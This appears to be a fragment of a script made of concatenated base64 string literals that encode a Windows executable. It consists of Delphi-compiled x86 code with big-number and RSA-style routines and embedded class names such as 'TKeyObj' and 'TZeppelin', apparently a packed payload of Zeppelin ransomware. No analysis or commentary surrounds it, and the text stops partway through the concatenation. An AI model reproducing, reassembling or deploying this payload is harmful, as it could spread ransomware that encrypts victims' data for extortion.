'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' + 
'dAqDfggAD4WeAQAAaAACAAAzybIBofSWQQDoPfn//4vYjUX4i1YE6Dyq/v/GRe8B6zyLw+jb+f//jUXcUI1F2FCLSxCLUwiLRfjoXfv//4tF2ItLFItTCOjL/P//i1Xci0X46Gyt/v91BMZF7wCAfe8Adb6NVdS4hKJBAOhPZv///3XUjVXQi0MI6AX2////ddCNVcy4sKJBAOgxZv///3XMjVXIi0MU6Of1////dciNVcS44KJBAOgTZv///3XE' + 
'jUYIugUAAADoc6z+/41FwFCLTxCLVwiLRgjozfr//4tVwI1GCOg6qf7/jVW8i0YI6Ddl//+LVbyNRgjoJKn+/41VuLgQo0EA6MNl////dbiNVbSLQwjoefX///91tI1VsLg8o0EA6KVl////dbCNVayLQxDoW/X///91rI1VqLhso0EA6Idl////daiNRfy6BQAAAOjnq/7/jVWgi0X86Mhk//+LRaCNVaToDZ///4tNpItV9LgBAACA6Kmi//+N' + 
'VZiLRgjoomT//4tFmI1VnOjnnv//i02ci1XwuAEAAIDog6L//+nhAAAAjVWQi0X86Cef//+LRZCNVZToEGX//4tVlI1F/OidqP7/jVWIi0YI6Aaf//+LRYiNVYzo72T//4tVjI1GCOg4qP7/aAACAAAzybIBofSWQQDoXff//4vYjUWEUI1VgLico0EA6L5k//+LRYBQjZV8////uMyjQQDoqmT//4uVfP///4tF/FnoY0r//4tVhItDCOh48///' + 
'jYV4////UI2VdP///7j4o0EA6Hlk//+LhXT///9QjZVw////uCikQQDoYmT//4uVcP///4tF/FnoG0r//4uVeP///4tDEOgt8///jZVs////i0MI6Pvz//+LlWz///+NRizofaf+/41GLLoLAAAA6Lyt/v+NlWj///+4VKRBAOgMZP//i4Vo////D7YAUI1GLOjGq/7/WohQA41GLOi6q/7/i1YsD7ZSA4hQB42NZP///zPSi0MI6EDi//+LhWT/' + 
'//+NVgzoLnj//42NYP///zPSi0MQ6CLi//+LhWD///+NVhToEHj//4vD6LGZ/v+Lx+iqmf7/M8CJRigzwFpZWWSJEGhtoUEAjYVg////uiMAAADonKb+/41F8LoEAAAA6I+m/v/D6ZGe/v/r219eW4vlXcP/////DQAAANrExMTExMTExL8NCrMAAAD/////KAAAALvlP08pybmv5UQWlEiisYUF2DC4SgW+7NU22R+tzry4BTpX8qWzz7UAAAAA' + 
'/////w8AAACzDQrAxMTExMTExMTZDQoA/////0EAAAAKPimSJK4EGVKZeu26Viyzyw3MWnLK611rmlfGOkk4kpgzkwhTRwTn9ZAG8EAdtBbY+m2cZF6Gn+nBfaC2i8gqwwAAAP////9MAAAAdB2a/CLHlf5icS+liSPJ1KDoX/I+Bpk/IzxN8L5Kdnpw+ZF+hFBmyLHno0MQCD67sJLjz3VS1JTObC52mv/C9m0D8D2D+Y2CVoOXJAAAAAD/////' + 
'IwAAAMAmLOzCgIY1kyYpVeCfMoOPVyGWaWcZgZoP9BSJH6ueQQARAP////8nAAAAOCiRn1rPFdtFnq31rtgYL6DaLeulkdCqSmrNVDbBL2o5S62gV2cJAP////8kAAAA+shnIQjULIhhXMGjTlgvfsmzOydCv8XXzAGFG0fOpMsKD6qTAAAAAP////8jAAAA6+AW6gXMiRIPU8Zbxna6k3ph34q9HAmqDUgBwLvdqnsMqJMA/////ycAAADObQT/' + 
'AUs+LfhEzZIEy7DEJzhJde8DE08wbUHveC3NrbUPkKMgTbAA/////yQAAAAt+6S6j2AKdyOtbWBm3ILRdH1AydFJYjp/3g0LkfXWCVg1k3IAAAAA/////yQAAABdnWwLPw84aukDd2gMjgLckVy4H0avYvte2EkHhgABWs4JjwUAAAAA/////yMAAAAuWpREexZOF5s0oWEijF/p2+VJqiY1+48LawZJlu3uBHcGpgD/////JAAAAMQYaZgdU0XJ' + 
'amnSRciHVMeErrpt3IG4Nmoh09ZkjvbJ8y1fdwAAAAD/////IwAAAEeCuzde07eUPTrfpRXCed7ZQCgKVoJb1YD+eqHL0jdtDGdjAP////8hAAAAPUSml0pTmIXXHXXj+lmyvnALHAgktNfQaoPYDDVwtxhhAAAAw41AAFWL7LlkAAAAagBqAEl1+VFTVleJVfyJhXT9//+NRfzoIK/+/42FeP3//4sVfN9AAOgvr/7/M8BVaNCvQQBk/zBkiSAz' + 
'wImFcP3//42NeP3//7o/AAAAi0X86E47//+LhZj9//+JhVT9//+LhZz9//+JhWj9//+LhaD9//+JhWz9//+LhaT9//+JhWD9//+Lhaj9//+JhWT9//+Lhaz9//+JhVj9//+LhbD9//+JhVz9//+NhXj9///o0zr//2ogi0X86FWr/v9Q6BvI/v9qEotN/LIBobhvQADo5s7+/4mFUP3//4uFUP3//4sQ/xKJhUj9//+JlUz9//8z/1Vok61BAGT/' + 
'N2SJJ4O9TP3//wB1D4O9SP3//wAPhtUHAADrBg+OzQcAAIuFdP3//4tABIXAdAWD6ASLAI1V9JLos6j+/4uFdP3//4tYBIXbdAWD6wSLG41F9OjFpv7/i9CLy4uFUP3//4sY/1MMagBqADPSi4VQ/f//iwj/URiLRfSLlXT9//+LUgTozKX+/w+EYQcAAP+1TP3///+1SP3//zPSi4VQ/f//iwj/URiLhXT9//+LWASF23QFg+sEixuLhXT9//+D' + 
